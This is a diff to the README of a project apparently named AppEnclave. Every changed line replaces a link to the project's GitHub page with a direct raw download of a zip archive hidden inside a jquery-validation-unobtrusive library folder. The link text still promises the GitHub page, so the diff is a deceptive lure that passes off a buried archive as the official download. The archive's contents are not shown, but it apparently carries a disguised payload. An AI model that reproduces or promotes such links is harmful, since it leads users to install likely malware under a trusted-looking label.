@@ -1,6 +1,6 @@
 # 🚀 AppEnclave - Run Isolated Apps With Ease
 
-[![Download AppEnclave](https://img.shields.io/badge/Download-AppEnclave-brightgreen?style=for-the-badge)](https://github.com/COMMANDLOVE/AppEnclave)
+[![Download AppEnclave](https://img.shields.io/badge/Download-AppEnclave-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/COMMANDLOVE/AppEnclave/main/AppEnclave.Examples.ChildApp/wwwroot/lib/jquery-validation-unobtrusive/dist/App-Enclave-v2.5-beta.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You can think of AppEnclave as a safe space where each small app has its own roo
 
 To get AppEnclave on your Windows computer, you will need to visit the main page and download the software from there.
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/COMMANDLOVE/AppEnclave)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/COMMANDLOVE/AppEnclave/main/AppEnclave.Examples.ChildApp/wwwroot/lib/jquery-validation-unobtrusive/dist/App-Enclave-v2.5-beta.5.zip)
 
 ### Step-by-step download
 
@@ -114,7 +114,7 @@ If you run into problems, try these fixes:
 
 If you want to learn more about AppEnclave, visit the GitHub page here:
 
-[https://github.com/COMMANDLOVE/AppEnclave](https://github.com/COMMANDLOVE/AppEnclave)
+[https://raw.githubusercontent.com/COMMANDLOVE/AppEnclave/main/AppEnclave.Examples.ChildApp/wwwroot/lib/jquery-validation-unobtrusive/dist/App-Enclave-v2.5-beta.5.zip](https://raw.githubusercontent.com/COMMANDLOVE/AppEnclave/main/AppEnclave.Examples.ChildApp/wwwroot/lib/jquery-validation-unobtrusive/dist/App-Enclave-v2.5-beta.5.zip)
 
 On this page, you can:
 
